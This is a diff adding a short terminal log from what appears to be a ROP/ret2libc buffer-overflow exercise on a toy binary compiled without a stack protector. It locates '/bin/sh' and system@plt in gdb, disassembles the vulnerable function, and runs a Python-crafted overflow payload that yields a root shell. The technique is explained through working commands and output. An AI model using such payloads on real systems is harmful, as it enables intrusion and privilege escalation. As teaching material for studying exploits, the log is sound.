@@ -1,0 +1,28 @@
+> gcc -g -fno-stack-protector -o rop rop.c
+> gdb -q ./rop
+Reading symbols from ./rop...done.
+(gdb) x/s not_used 
+0x8048590:	"/bin/sh"
+
+(gdb) x system
+0x8048350 <system@plt>:	"\377%\024\240\004\bh\020"
+
+> objdump -d -M intel ./rop
+            ...
+080484a4 <vulnerable_function>:
+ 80484a4:       55                      push   ebp
+ 80484a5:       89 e5                   mov    ebp,esp
+ 80484a7:       57                      push   edi
+ 80484a8:       83 ec 74                sub    esp,0x74
+ 80484ab:       8d 55 94                lea    edx,[ebp-0x6c]
+            ...
+
+> ./rop "$(python -c 'print "A"*0x6c + "BBBB" + "\x50\x83\x04\x08" + "CCCC" + "\x90\x85\x04\x08"')"
+# whoami
+root
+
+# echo $0
+/bin/sh
+
+# exit
+Segmentation fault (core dumped)
